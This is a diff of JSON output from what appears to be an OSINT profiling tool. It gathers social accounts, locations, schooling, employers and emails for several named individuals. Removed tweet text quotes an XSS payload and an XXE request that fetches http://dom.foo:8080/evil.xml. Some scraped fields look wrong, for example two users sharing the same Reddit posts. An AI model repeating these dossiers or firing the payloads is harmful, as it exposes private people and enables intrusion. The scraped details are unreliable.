@@ -31,7 +31,7 @@
                     "twitter_username": "bhavsec",
                     "public_repos": 3,
                     "public_gists": 1,
-                    "followers": 77,
+                    "followers": 78,
                     "following": 16,
                     "created_at": "2015-06-05T17:25:11Z",
                     "updated_at": "2020-07-27T00:57:06Z"
@@ -45,37 +45,31 @@
                     "www.chess.com": "https://www.chess.com/member/bhavsec"
                 },
                 {
-                    "en.gravatar.com": "http://en.gravatar.com/profiles/bhavsec.json"
+                    "www.fiverr.com": "https://www.fiverr.com/bhavsec"
                 },
                 {
                     "api.github.com": "https://api.github.com/users/bhavsec"
                 },
                 {
-                    "hackerone.com": "https://hackerone.com/bhavsec"
+                    "en.gravatar.com": "http://en.gravatar.com/profiles/bhavsec.json"
                 },
                 {
-                    "www.facebook.com": "https://www.facebook.com/bhavsec"
+                    "hackerone.com": "https://hackerone.com/bhavsec"
                 },
                 {
                     "www.instagram.com": "https://www.instagram.com/bhavsec/"
                 },
                 {
-                    "www.fiverr.com": "https://www.fiverr.com/bhavsec"
+                    "keybase.io": "https://keybase.io/bhavsec"
                 },
                 {
                     "medium.com": "https://medium.com/@bhavsec"
                 },
                 {
-                    "keybase.io": "https://keybase.io/bhavsec"
-                },
-                {
-                    "steamcommunity.com": "https://steamcommunity.com/id/bhavsec"
+                    "www.facebook.com": "https://www.facebook.com/bhavsec"
                 },
                 {
                     "ifttt.com": "https://ifttt.com/p/bhavsec"
-                },
-                {
-                    "www.xboxgamertag.com": "https://www.xboxgamertag.com/search/bhavsec"
                 },
                 {
                     "www.pinterest.com": "https://www.pinterest.com/bhavsec/"
@@ -84,16 +78,25 @@
                     "open.spotify.com": "https://open.spotify.com/user/bhavsec"
                 },
                 {
-                    "wordpress.org": "https://wordpress.org/support/users/bhavsec/"
+                    "psnprofiles.com": "https://psnprofiles.com/bhavsec"
                 },
                 {
-                    "psnprofiles.com": "https://psnprofiles.com/bhavsec"
+                    "t.me": "https://t.me/bhavsec"
+                },
+                {
+                    "steamcommunity.com": "https://steamcommunity.com/id/bhavsec"
                 },
                 {
                     "profiles.wordpress.org": "https://profiles.wordpress.org/bhavsec/"
                 },
                 {
+                    "wordpress.org": "https://wordpress.org/support/users/bhavsec/"
+                },
+                {
                     "www.tf2items.com": "http://www.tf2items.com/id/bhavsec/"
+                },
+                {
+                    "www.xboxgamertag.com": "https://www.xboxgamertag.com/search/bhavsec"
                 }
             ],
             "gravatar": {
@@ -187,27 +190,24 @@
                         "Web designing"
                     ],
                     "Education": [
-                        "",
-                        "",
                         "Chandigarh UniversityClass of 2018 \u00b7 Computer Science Engineering",
-                        "",
                         "SITA GRAMMAR SCHOOLLeft in 2014 \u00b7 Malerkotla",
-                        "",
                         "Anand Isher Public Senior Secondary SchoolLeft in 2011 \u00b7 Ahmedgarh"
                     ]
                 },
                 "Current_city": "Montreal, Quebec since 13 January",
                 "Contact": "http://facebook.com/bhavsec",
-                "ProfilePic": "https://scontent.fcjb1-1.fna.fbcdn.net/v/t1.0-1/p160x160/86694870_10221671768972174_2134184548055908352_n.jpg?_nc_cat=106&_nc_sid=dbb9e7&_nc_oc=AQko__5eK_wzwyUb7p5mfyu2KHP7OqwDvYIF7eczilLmhC39J6q4hO8bu_uTpXLVqmQ&_nc_ht=scontent.fcjb1-1.fna&_nc_tp=6&oh=2c9c391570d0c309a7169f303f55da62&oe=5F33867A"
+                "ProfilePic": "https://scontent.fcjb1-1.fna.fbcdn.net/v/t1.0-1/p160x160/86694870_10221671768972174_2134184548055908352_n.jpg?_nc_cat=106&_nc_sid=dbb9e7&_nc_ohc=JrN8a9awDWsAX8O0vm2&_nc_oc=AQlmMrtBmqZwsKWD3KJT0DlIOl8ltyeeO5B6L68bglc7e-KEylSVlhd9HE5WRx4pHHQ&_nc_ht=scontent.fcjb1-1.fna&_nc_tp=6&oh=79daba8d0991172e46998fc42cc496b4&oe=5F4B417A"
             },
             "instadata": {
                 "Name": "BhavKaran",
                 "URL": "http://youtube.com/bhavsec/",
                 "Bio": "\ud83d\udc7eHacker \ud83d\udea8Red Team \ud83d\udcbb Developer \ud83d\udcb5 Independent Security Researcher \ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb Pentester \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Founder @sec_army \ud83c\uddee\ud83c\uddf3\ud83c\udde8\ud83c\udde6",
-                "Followers": "33698",
-                "Following": "978",
-                "No_of_posts": 12,
+                "Followers": 33698,
+                "Following": 983,
+                "No_of_posts": 225,
                 "Location": [
+                    "Downtown, Montreal",
                     "Vieux-Port de Montr\u00e9al",
                     "Mont-Royal, Quebec",
                     "Montreal Canada",
@@ -217,50 +217,29 @@
                     "Concordia University",
                     "Mount Royal",
                     "Concordia University Webster Library - LB",
-                    "Montreal, Quebec",
-                    "Old Port of Montreal"
+                    "Montreal, Quebec"
                 ],
-                "ProfilePic": "https://instagram.fmaa2-1.fna.fbcdn.net/v/t51.2885-19/s320x320/104344746_337060367476616_8891846744168531469_n.jpg?_nc_ht=instagram.fmaa2-1.fna.fbcdn.net&_nc_ohc=bApP5Cd5C7YAX9syr4f&oh=05e649c7efdefcee6f5dd5325cd33383&oe=5F4BA2B3"
+                "ProfilePic": "https://scontent-cdg2-1.cdninstagram.com/v/t51.2885-19/s150x150/104344746_337060367476616_8891846744168531469_n.jpg?_nc_ht=scontent-cdg2-1.cdninstagram.com&_nc_ohc=EI5wDrBnH4AAX_c2bRC&oh=86236bd36c214a8eaad018a23085347a&oe=5F51A54B"
             },
             "twitterdata": {
-                "ProfilePic": "https://pbs.twimg.com/profile_images/1275092618117025792/R5ZMB6lt_400x400.jpg",
-                "User_Name": "bhavsec",
-                "User_Id": "bhavsec",
-                "Description": "Hacker, Python Developer, Red Teamer, Web Application & Network Pentester, Security Researcher.",
-                "Location": "Canada",
-                "Web_Link": "https://bhavkaran.com",
-                "Twitter_Join_Date": "Joined April 2017",
-                "Birthday": "Birth Date not provided by the user",
-                "Total_Tweets": "223",
-                "Following": "176",
-                "Followers": "Zero",
-                "Tweets": {
-                    "0": "Checkout reNgine-tool for web app recon automation\nreNgine uses configurable scan engines to perform end to end reconnaissance with YAML based configuration allows you to use tools of your choice, wordlist, and many more\n#bugbounty #recon \nGitHub:https://github.com/yogeshojha/rengine\u00a0\u2026",
-                    "1": "Verifying myself: I am bhavsec on http://Keybase.io\u00a0. DnOFzd3d9b-krKtvfiE9D2d6eov-RIIqNvhc / https://keybase.io/bhavsec/sigs/DnOFzd3d9b-krKtvfiE9D2d6eov-RIIqNvhc\u00a0\u2026",
-                    "2": "new macOS CVE-2020-9788 in one tweet :\n\"<img src=1 onerror=document.documentElement.textContent=window.location>.keychain\"pic.twitter.com/jXanwzafk4",
-                    "3": "Writeup on how I made $40,000 breaking the new Chromium Edge using essentially two XSS flaws.https://leucosite.com/Edge-Chromium-EoP-RCE/\u00a0\u2026",
-                    "4": "Bug of the Week! XSS in GMail\u2019s #amp4email implementation via DOM Clobbering by @SecurityMB:https://research.securitum.com/xss-in-amp4email-dom-clobbering/\u00a0\u2026",
-                    "5": "The only legitimate reason to stop hacking is to read this week's A-MA-ZING #BugBytes, with content from @PwnFunction, @secarmyofficial,  and @jespinhara! Have you subscribed already? https://go.intigriti.com/bugbytes-26\u00a0",
-                    "6": "@bugdiscover_ is a partner for SEC-ARMY CTF Event\nwinners of the CTF Event will be announced soon\nStay Tuned!pic.twitter.com/VR3xoW7faH",
-                    "7": "@bugdiscover_ is at Contrivance\nCome meet us & get your swags!\n#contrivance #bugdiscoverpic.twitter.com/U0Hj2uwtx6",
-                    "8": "Security And Research Company (SECARMY) is exhibiting and Organising CTF Hacking Event at Contrivance, Greater Noida, India. \n\nIntroducing our Cyber Security Services and Trainings to secure all type of Organizations.\n\nWe are also giving free cool swag and stickers to everyone.pic.twitter.com/Hb12bKKyZE",
-                    "9": "I love a good XXE writeup, its by far my favourite bugclass. Did you guys catch this one? <3\n\nhttp://opencms.tld/opencms/opencms/handleSolrSelect?fq={!xmlparser%20v=%27<!DOCTYPE+a+[<!ENTITY+\\u0025+asd+SYSTEM+\"http://dom.foo:8080/evil.xml\u00a0\">\\u0025asd%3b\\u0025c%3b]><a>%26rrr%3b</a>%27}https://twitter.com/ShielderSec/status/1117106469328039936\u00a0\u2026"
-                }
+                "ProfilePic": "https://pbs.twimg.com/media/D0rJIOmUcAEtlEw.jpg:thumb\" width=\"138",
+                "User_Name": "Not Found",
+                "Error": "Profile Not Found"
             },
             "linkedin": {
-                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5103AQHrnyo9wHCtpw/profile-displayphoto-shrink_200_200/0?e=1601510400&v=beta&t=h_UFR1GpmZ7dE5vdMVJP58uHyqE9cU0PWK0p3ch0IMI",
+                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5103AQHrnyo9wHCtpw/profile-displayphoto-shrink_200_200/0?e=1602115200&v=beta&t=Zh34VBHuQ6sLQ4aMpJ5Hbenyi7Ul16GiN01sbM87YVk",
                 "Name": "Bhavkaran Singh Chahal",
-                "Bio": "CEH, Cyber Security Researcher, Developer",
+                "Bio": "Certified Ethical Hacker, Cyber Security Researcher, Developer, Red Teamer.",
                 "Location": "Montreal, Quebec, Canada",
                 "About": "I am an Independent Security researcher who is passionate about making open-source more accessible, creating\ntechnology to elevate people, and building information security community for cyber security researchers. Some\n\n      technologies I enjoy working with Python, Bash, Javascript....\n            see more\n\n... see more",
                 "Experience": [
                     {
-                        "Position": "Data Research Analyst",
-                        "Company": "The Logit Group, Inc. Part-time"
-                    },
-                    {
                         "Position": "Founder & Leader",
                         "Company": "Security and Research Community (SECARMY)"
+                    },
+                    {
+                        "Position": "Market Research Interviewer",
+                        "Company": "The Logit Group, Inc. Part-time"
                     },
                     {
                         "Position": "Security Consultant",
@@ -283,6 +262,8 @@
                 ]
             },
             "location": [
+                "Montreal, Quebec since 13 January",
+                "Downtown, Montreal",
                 "Vieux-Port de Montr\u00e9al",
                 "Mont-Royal, Quebec",
                 "Montreal Canada",
@@ -292,608 +273,9 @@
                 "Concordia University",
                 "Mount Royal",
                 "Concordia University Webster Library - LB",
-                "Montreal, Quebec",
-                "Old Port of Montreal",
-                "Canada"
-            ]
-        },
-        "akinfosec": {
-            "github": null,
-            "tinder": null,
-            "whatname": [
-                {
-                    "akinfosec.blogspot.com": "http://akinfosec.blogspot.com"
-                },
-                {
-                    "open.spotify.com": "https://open.spotify.com/user/akinfosec"
-                }
+                "Montreal, Quebec"
             ],
-            "gravatar": null,
-            "tiktok": null,
-            "medium": null,
-            "pinterest": null,
-            "keybase": null,
-            "reddit": null,
-            "fbdata": {
-                "Name": "Adithyan AK",
-                "Error": "Profile Not Found"
-            },
-            "instadata": {
-                "Error": "Profile Not Found"
-            },
-            "twitterdata": {
-                "ProfilePic": "https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png",
-                "User_Name": "akinfosec",
-                "User_Id": "akinfosec",
-                "Description": "",
-                "Location": "",
-                "Web_Link": "No contact link is provided by the user",
-                "Twitter_Join_Date": "Joined November 2008",
-                "Birthday": "Birth Date not provided by the user",
-                "Total_Tweets": "More",
-                "Following": "Zero",
-                "Followers": "Zero",
-                "Tweets": {}
-            },
-            "linkedin": {
-                "Profileimg": "https://media-exp1.licdn.com/dms/image/C4D03AQFfTif6E53P9A/profile-displayphoto-shrink_200_200/0?e=1601510400&v=beta&t=G-kkfWcIGkZHAxO2Owv0WBD0d7NQE8URR74FfnUPIOY",
-                "Name": "Adithyan Ak",
-                "Bio": "Chapter Head at OWASP Coimbatore | Former Intern at Gurgoan Cybercell | Security Researcher | Exploit Developer",
-                "Location": "Coimbatore, Tamil Nadu, India",
-                "About": "Experienced Security Researcher with a demonstrated history of working in the computer and network security industry.\nSkilled in Security Research, Penetration Testing, Web Application Security, Network Security, and Information Security.\n\n      Strong information technology professional with a Bachelor of Technology - BTech focused in Information T...\n            see more\n\n... see more",
-                "Experience": [
-                    {
-                        "Position": "Chapter Head",
-                        "Company": "OWASP Coimbatore Full-time"
-                    },
-                    {
-                        "Position": "Former Intern",
-                        "Company": "Gurugram Cybercell Internship"
-                    },
-                    {
-                        "Position": "Application Security Tester",
-                        "Company": "Stewards Internship"
-                    },
-                    {
-                        "Position": "Security Researcher",
-                        "Company": "Tph Infosec Part-time"
-                    },
-                    {
-                        "Position": "Penetration Tester",
-                        "Company": "Tamil Internet Security Team"
-                    }
-                ],
-                "Education": [
-                    {
-                        "University": "Sri Krishna College of Engineering and Technology",
-                        "Degree": "Bachelor of Technology - BTech"
-                    }
-                ]
-            },
-            "location": [
-                ""
-            ]
-        },
-        "seshadrimagnet": {
-            "github": null,
-            "tinder": null,
-            "whatname": [
-                {
-                    "open.spotify.com": "https://open.spotify.com/user/seshadrimagnet"
-                }
-            ],
-            "gravatar": null,
-            "tiktok": null,
-            "medium": null,
-            "pinterest": null,
-            "keybase": null,
-            "reddit": null,
-            "fbdata": {
-                "Error": "Profile Not Found"
-            },
-            "instadata": {
-                "Error": "Profile Not Found"
-            },
-            "twitterdata": {
-                "ProfilePic": "",
-                "User_Name": "Not Found",
-                "Error": "Profile Not Found"
-            },
-            "linkedin": null,
-            "location": []
-        },
-        "srshkmr": {
-            "github": {
-                "Profile": {
-                    "login": "srshkmr",
-                    "id": 8898147,
-                    "node_id": "MDQ6VXNlcjg4OTgxNDc=",
-                    "avatar_url": "https://avatars2.githubusercontent.com/u/8898147?v=4",
-                    "gravatar_id": "",
-                    "url": "https://api.github.com/users/srshkmr",
-                    "html_url": "https://github.com/srshkmr",
-                    "followers_url": "https://api.github.com/users/srshkmr/followers",
-                    "following_url": "https://api.github.com/users/srshkmr/following{/other_user}",
-                    "gists_url": "https://api.github.com/users/srshkmr/gists{/gist_id}",
-                    "starred_url": "https://api.github.com/users/srshkmr/starred{/owner}{/repo}",
-                    "subscriptions_url": "https://api.github.com/users/srshkmr/subscriptions",
-                    "organizations_url": "https://api.github.com/users/srshkmr/orgs",
-                    "repos_url": "https://api.github.com/users/srshkmr/repos",
-                    "events_url": "https://api.github.com/users/srshkmr/events{/privacy}",
-                    "received_events_url": "https://api.github.com/users/srshkmr/received_events",
-                    "type": "User",
-                    "site_admin": false,
-                    "name": "Suresh Kumar Vellingiri",
-                    "company": "@crystaldelta ",
-                    "blog": "",
-                    "location": "Chennai-India",
-                    "email": null,
-                    "hireable": null,
-                    "bio": "Senior Engineer - @crystaldelta ",
-                    "twitter_username": null,
-                    "public_repos": 4,
-                    "public_gists": 11,
-                    "followers": 3,
-                    "following": 0,
-                    "created_at": "2014-09-24T11:42:08Z",
-                    "updated_at": "2020-07-14T08:54:56Z"
-                },
-                "Repository": [],
-                "Mails": []
-            },
-            "tinder": null,
-            "whatname": [
-                {
-                    "api.bodybuilding.com": "http://api.bodybuilding.com/api-proxy/bbc/get?slug=srshkmr"
-                },
-                {
-                    "api.github.com": "https://api.github.com/users/srshkmr"
-                },
-                {
-                    "www.chess.com": "https://www.chess.com/member/srshkmr"
-                },
-                {
-                    "www.ebay.com": "https://www.ebay.com/usr/srshkmr"
-                },
-                {
-                    "www.behance.net": "https://www.behance.net/srshkmr"
-                },
-                {
-                    "open.spotify.com": "https://open.spotify.com/user/srshkmr"
-                },
-                {
-                    "www.fiverr.com": "https://www.fiverr.com/srshkmr"
-                },
-                {
-                    "giphy.com": "https://giphy.com/channel/srshkmr"
-                },
-                {
-                    "ask.fm": "https://ask.fm/srshkmr"
-                },
-                {
-                    "www.wattpad.com": "https://www.wattpad.com/user/srshkmr"
-                },
-                {
-                    "www.smule.com": "https://www.smule.com/srshkmr/"
-                },
-                {
-                    "www.pinterest.com": "https://www.pinterest.com/srshkmr/"
-                },
-                {
-                    "www.instagram.com": "https://www.instagram.com/srshkmr/"
-                },
-                {
-                    "hackerone.com": "https://hackerone.com/srshkmr"
-                },
-                {
-                    "gitlab.com": "https://gitlab.com/srshkmr"
-                },
-                {
-                    "www.myfitnesspal.com": "https://www.myfitnesspal.com/user/srshkmr/status"
-                },
-                {
-                    "www.kongregate.com": "https://www.kongregate.com/accounts/srshkmr"
-                },
-                {
-                    "steamcommunity.com": "https://steamcommunity.com/id/srshkmr"
-                },
-                {
-                    "social.technet.microsoft.com": "https://social.technet.microsoft.com/profile/srshkmr/"
-                },
-                {
-                    "www.tf2items.com": "http://www.tf2items.com/id/srshkmr/"
-                },
-                {
-                    "www.reddit.com": "https://www.reddit.com/user/srshkmr"
-                }
-            ],
-            "gravatar": null,
-            "tiktok": null,
-            "medium": null,
-            "pinterest": {
-                "full_name": "S\u00fbr\u00ebsh K\u00fcm\u00e3r",
-                "profile_image": "https://i.pinimg.com/280x280_RS/6b/2d/4c/6b2d4c9cdeeb5033654113601929b04a.jpg",
-                "followers": 0,
-                "followings": 5,
-                "bio": "",
-                "country": "IN",
-                "impressum_url": null,
-                "website": null,
-                "board_count": 0,
-                "location": "",
-                "pin_count": 0,
-                "is_verified": false
-            },
-            "keybase": null,
-            "reddit": {
-                "username": "srshkmr",
-                "posts": [
-                    "Recently got my Nanopi Neo3. Thoughts, interesting benchmark results and comparison to Raspberry Pi 3.",
-                    "Double golden Hogger Reno \u00af\\_(\u30c4)_/\u00af",
-                    "How to at least get 4th with Mukla",
-                    "I beat a 12 winstreak 50+ health divine shield poisonous murlocs Fungalmancer with this beast comp. He had 36 health so it took two turns.",
-                    "I actually got into the final round 15 red whelp",
-                    "Integrating a second Server with OpenVPN",
-                    "Windows 2012 R2 Servers getting SYN-flooded regularily. Any proactive solutions?",
-                    "Jesse complains about erotic fan fiction",
-                    "NSG attached to Application Gateway subnet. How best to allow traffic from Web Apps (Vnet integration)?",
-                    "Application Gateway - really no alternative to using CNAME?",
-                    "Are rat runs possible with 3 players? If so what should be cut?",
-                    "[12-0] Paladin [01-01-16]",
-                    "The Openings of Fallout 3 and New Vegas - In-depth comparison",
-                    "New How to Paladin XXXVII - Draenor Edition!",
-                    "The Kripp: No More Well Met :(",
-                    "How to use Twitter",
-                    "On Faction Imbalance in Random Battleground Populations",
-                    "Class Distribution Data for Patch 5.4.2",
-                    "So.. Anyone else here into Touhou? :) (Wait for it)",
-                    "Current Constructed in a nutshell",
-                    "Timewaste Isle? | Sacred Duty",
-                    "5.4 WeakAuras Strings",
-                    "On Connected Realms",
-                    "Class Distribution Data for Patch 5.4",
-                    "Protection Paladin |Eternal Flame & You? | Theck"
-                ]
-            },
-            "fbdata": {
-                "Name": "Suresh Kumar Verma",
-                "Error": "Profile Not Found"
-            },
-            "instadata": {
-                "Name": "Suresh Kumar Natesan",
-                "Bio": "",
-                "Followers": 100,
-                "Following": 47,
-                "No_of_posts": 36,
-                "Location": [],
-                "ProfilePic": "https://instagram.frix7-1.fna.fbcdn.net/v/t51.2885-19/s150x150/26866491_740049742860726_2100250586975830016_n.jpg?_nc_ht=instagram.frix7-1.fna.fbcdn.net&_nc_ohc=nL8LuvbQ9gMAX_S0V3X&oh=ee63875ef036087c54755c80c5ce2962&oe=5F4CEFCA"
-            },
-            "twitterdata": {
-                "ProfilePic": "https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png",
-                "User_Name": "sureshkumar",
-                "User_Id": "srshkmr",
-                "Description": "",
-                "Location": "",
-                "Web_Link": "No contact link is provided by the user",
-                "Twitter_Join_Date": "Joined November 2010",
-                "Birthday": "Birth Date not provided by the user",
-                "Total_Tweets": "1",
-                "Following": "1",
-                "Followers": "Zero",
-                "Tweets": {}
-            },
-            "linkedin": {
-                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5603AQFzBJahMu3hFw/profile-displayphoto-shrink_200_200/0?e=1601510400&v=beta&t=_HGPvj_FFaAF1dLqO9u5bQRseFd_N0uDYuxMdzwbiXA",
-                "Name": "Suresh Kumar Vellingiri",
-                "Bio": "Senior Software Engineer at Crystal Delta",
-                "Location": "Coimbatore, Tamil Nadu, India",
-                "About": "Experienced Hacker and Developer with a demonstrated history of working in the computer and network security\nindustry. Skilled in  Ruby on Rails, Android, PHP, Node JS and React JS. Strong engineering professional with a Bachelor\n\n      of Engineering (BE) focused in Computer Science and Engineering from Hindusthan Institute of Technology.\n... see more",
-                "Experience": [
-                    {
-                        "Position": "Company Name\nCrystal Delta",
-                        "Company": null
-                    },
-                    {
-                        "Position": "Security Researcher",
-                        "Company": "Independent"
-                    },
-                    {
-                        "Position": "Administrator",
-                        "Company": "Eternaverse"
-                    }
-                ],
-                "Education": [
-                    {
-                        "University": "Hindusthan Institute of Technology",
-                        "Degree": "Bachelor of Engineering (BE)"
-                    },
-                    {
-                        "University": "Elgi Matriculation Higher Secondary School",
-                        "Degree": "High School"
-                    }
-                ]
-            },
-            "location": [
-                ""
-            ]
-        },
-        "aravindha1234u": {
-            "github": {
-                "Profile": {
-                    "login": "Aravindha1234u",
-                    "id": 52521300,
-                    "node_id": "MDQ6VXNlcjUyNTIxMzAw",
-                    "avatar_url": "https://avatars0.githubusercontent.com/u/52521300?v=4",
-                    "gravatar_id": "",
-                    "url": "https://api.github.com/users/Aravindha1234u",
-                    "html_url": "https://github.com/Aravindha1234u",
-                    "followers_url": "https://api.github.com/users/Aravindha1234u/followers",
-                    "following_url": "https://api.github.com/users/Aravindha1234u/following{/other_user}",
-                    "gists_url": "https://api.github.com/users/Aravindha1234u/gists{/gist_id}",
-                    "starred_url": "https://api.github.com/users/Aravindha1234u/starred{/owner}{/repo}",
-                    "subscriptions_url": "https://api.github.com/users/Aravindha1234u/subscriptions",
-                    "organizations_url": "https://api.github.com/users/Aravindha1234u/orgs",
-                    "repos_url": "https://api.github.com/users/Aravindha1234u/repos",
-                    "events_url": "https://api.github.com/users/Aravindha1234u/events{/privacy}",
-                    "received_events_url": "https://api.github.com/users/Aravindha1234u/received_events",
-                    "type": "User",
-                    "site_admin": false,
-                    "name": "T3cH_W1z4rD",
-                    "company": "Secarmny Developer",
-                    "blog": "https://aravindha1234u.github.io",
-                    "location": "India",
-                    "email": null,
-                    "hireable": null,
-                    "bio": "\r\n    Cybersecurity Enthusiastic | InfoSec | Pentester | CTF Player | 0-Day Exploits\r\n",
-                    "twitter_username": "aravindha1234u",
-                    "public_repos": 17,
-                    "public_gists": 1,
-                    "followers": 19,
-                    "following": 34,
-                    "created_at": "2019-07-04T05:19:29Z",
-                    "updated_at": "2020-08-02T04:58:51Z"
-                },
-                "Repository": [
-                    "CTF-Writeups",
-                    "CTFd",
-                    "dc9111_0x03",
-                    "githubchallenge",
-                    "graduation"
-                ],
-                "Mails": [
-                    "kchung@nyu.edu",
-                    "19695201+BOAKGP@users.noreply.github.com",
-                    "jp@juanpabloflores.me",
-                    "0e85dc6eaf@protonmail.com",
-                    "aravindha1234u@gmail.com",
-                    "microdev@gmail.com"
-                ]
-            },
-            "tinder": null,
-            "whatname": [
-                {
-                    "aravindha1234u.blogspot.com": "http://aravindha1234u.blogspot.com"
-                },
-                {
-                    "en.gravatar.com": "http://en.gravatar.com/profiles/aravindha1234u.json"
-                },
-                {
-                    "medium.com": "https://medium.com/@aravindha1234u"
-                },
-                {
-                    "api.github.com": "https://api.github.com/users/aravindha1234u"
-                },
-                {
-                    "discuss.codecademy.com": "https://discuss.codecademy.com/u/aravindha1234u/summary"
-                },
-                {
-                    "www.facebook.com": "https://www.facebook.com/aravindha1234u"
-                },
-                {
-                    "t.me": "https://t.me/aravindha1234u"
-                },
-                {
-                    "www.instagram.com": "https://www.instagram.com/aravindha1234u/"
-                },
-                {
-                    "open.spotify.com": "https://open.spotify.com/user/aravindha1234u"
-                },
-                {
-                    "www.pinterest.com": "https://www.pinterest.com/aravindha1234u/"
-                },
-                {
-                    "profiles.wordpress.org": "https://profiles.wordpress.org/aravindha1234u/"
-                },
-                {
-                    "wordpress.org": "https://wordpress.org/support/users/aravindha1234u/"
-                },
-                {
-                    "www.reddit.com": "https://www.reddit.com/user/aravindha1234u"
-                }
-            ],
-            "gravatar": {
-                "entry": [
-                    {
-                        "id": "83506665",
-                        "hash": "c3414f35d074667fe46618c6d068630f",
-                        "requestHash": "aravindha1234u",
-                        "profileUrl": "http://gravatar.com/aravindha1234u",
-                        "preferredUsername": "aravindha1234u",
-                        "thumbnailUrl": "https://secure.gravatar.com/avatar/c3414f35d074667fe46618c6d068630f",
-                        "photos": [
-                            {
-                                "value": "https://secure.gravatar.com/avatar/c3414f35d074667fe46618c6d068630f",
-                                "type": "thumbnail"
-                            }
-                        ],
-                        "profileBackground": {
-                            "color": "#",
-                            "url": "https://secure.gravatar.com/bg/83506665/e97f1e83e5dc3defd591e34ba5464f23"
-                        },
-                        "name": {
-                            "givenName": "Aravindha Hariharan",
-                            "familyName": "M",
-                            "formatted": "Aravindha Hariharan"
-                        },
-                        "displayName": "Aravindha",
-                        "aboutMe": "Cybersecurity Enthusiastic | InfoSec | Pentester | CTF Player | 0-Day Exploits",
-                        "currentLocation": "Coimbatore",
-                        "emails": [
-                            {
-                                "primary": "true",
-                                "value": "aravindha1234u@gmail.com"
-                            }
-                        ],
-                        "urls": []
-                    }
-                ]
-            },
-            "tiktok": null,
-            "medium": null,
-            "pinterest": {
-                "full_name": "Aravindha Professional",
-                "profile_image": "https://i.pinimg.com/280x280_RS/2f/04/02/2f0402894c7f6c13255e730a00b1f48e.jpg",
-                "followers": 0,
-                "followings": 6,
-                "bio": "",
-                "country": "IN",
-                "impressum_url": null,
-                "website": null,
-                "board_count": 0,
-                "location": "",
-                "pin_count": 0,
-                "is_verified": false
-            },
-            "keybase": null,
-            "reddit": {
-                "username": "aravindha1234u",
-                "posts": [
-                    "Recently got my Nanopi Neo3. Thoughts, interesting benchmark results and comparison to Raspberry Pi 3.",
-                    "Double golden Hogger Reno \u00af\\_(\u30c4)_/\u00af",
-                    "How to at least get 4th with Mukla",
-                    "I beat a 12 winstreak 50+ health divine shield poisonous murlocs Fungalmancer with this beast comp. He had 36 health so it took two turns.",
-                    "I actually got into the final round 15 red whelp",
-                    "Integrating a second Server with OpenVPN",
-                    "Windows 2012 R2 Servers getting SYN-flooded regularily. Any proactive solutions?",
-                    "Jesse complains about erotic fan fiction",
-                    "NSG attached to Application Gateway subnet. How best to allow traffic from Web Apps (Vnet integration)?",
-                    "Application Gateway - really no alternative to using CNAME?",
-                    "Are rat runs possible with 3 players? If so what should be cut?",
-                    "[12-0] Paladin [01-01-16]",
-                    "The Openings of Fallout 3 and New Vegas - In-depth comparison",
-                    "New How to Paladin XXXVII - Draenor Edition!",
-                    "The Kripp: No More Well Met :(",
-                    "How to use Twitter",
-                    "On Faction Imbalance in Random Battleground Populations",
-                    "Class Distribution Data for Patch 5.4.2",
-                    "So.. Anyone else here into Touhou? :) (Wait for it)",
-                    "Current Constructed in a nutshell",
-                    "Timewaste Isle? | Sacred Duty",
-                    "5.4 WeakAuras Strings",
-                    "On Connected Realms",
-                    "Class Distribution Data for Patch 5.4",
-                    "Protection Paladin |Eternal Flame & You? | Theck"
-                ]
-            },
-            "fbdata": {
-                "Name": "Aravindha Hariharan (Techwizard)",
-                "Work_Education": {
-                    "Work": [
-                        "SecarmyDeveloper \u00b7 11 April 2020 to present"
-                    ],
-                    "Education": [
-                        "kikani vidhya mandirOn 25 Dec 2016 \u00b7 Coimbatore, Tamil Nadu"
-                    ]
-                },
-                "Current_city": "Coimbatore, Tamil Nadu",
-                "Home_Town": "Coimbatore, Tamil Nadu",
-                "Contact": "http://facebook.com/aravindha1234u",
-                "ProfilePic": "https://scontent.fcjb1-1.fna.fbcdn.net/v/t1.0-1/p160x160/74420830_772181786538512_6522794822737068032_o.jpg?_nc_cat=104&_nc_sid=dbb9e7&_nc_ohc=lTa7tDJJ2pUAX_y1nRL&_nc_oc=AQlNKCqXs-qJeVzJOxYqrGKdMSzGQtlb-hjMjXW-zpQG1V5NxAw-KK2Bln-nVE_f-aU&_nc_ht=scontent.fcjb1-1.fna&_nc_tp=6&oh=421d6a58e9ef110cbbf5a6cfa955b4bf&oe=5F4BAFC2"
-            },
-            "instadata": {
-                "Name": "Aravindha Hariharan",
-                "URL": "https://youtu.be/ar70JBIBJT8",
-                "Bio": "\ud83c\udf8212 August\n\ud83d\udd76\ufe0fCreative\n\ud83d\udcdaEx-Kikanian\n\ud83d\udcbc Secarmy Developer @sec_army\n\ud83c\udf93SKCET\n\u2702\ufe0fEditor\n\ud83c\udfa7Music\n\ud83d\udd0aBass lover\n\ud83c\udfaePUBG\n\ud83d\udc80Skullcandy\n\ud83d\udda5\ufe0fT3cH_W1z4rD\n#liveletlive",
-                "Followers": 1781,
-                "Following": 372,
-                "No_of_posts": 341,
-                "Location": [],
-                "ProfilePic": "https://scontent-frx5-1.cdninstagram.com/v/t51.2885-19/s150x150/69431981_460809657837035_7388788520283799552_n.jpg?_nc_ht=scontent-frx5-1.cdninstagram.com&_nc_ohc=dkRZEYS4-H4AX_3BKDX&oh=26b5b1dab18cb6daca5b3249faf87cd3&oe=5F505164"
-            },
-            "twitterdata": {
-                "ProfilePic": "https://pbs.twimg.com/profile_images/1276739451671076864/nbDXaMmW_400x400.jpg",
-                "User_Name": "Aravindha Hariharan",
-                "User_Id": "aravindha1234u",
-                "Description": "Cybersecurity Enthusiastic | Secarmy Developer | CTF Player | InfoSec | Red-Hat Academy Student Ambassador",
-                "Location": "Coimbatore",
-                "Web_Link": "https://github.com/bhavsec/reconspider",
-                "Twitter_Join_Date": "Joined December 2016",
-                "Birthday": "Birth Date not provided by the user",
-                "Total_Tweets": "459",
-                "Following": "709",
-                "Followers": "Zero",
-                "Tweets": {
-                    "0": "That's was great participating and placing in top 10 in @THREAT_CON Cmd+Ctrl which was organised by @SecInnovationhttps://twitter.com/THREAT_CON/status/1274352789099954176\u00a0\u2026",
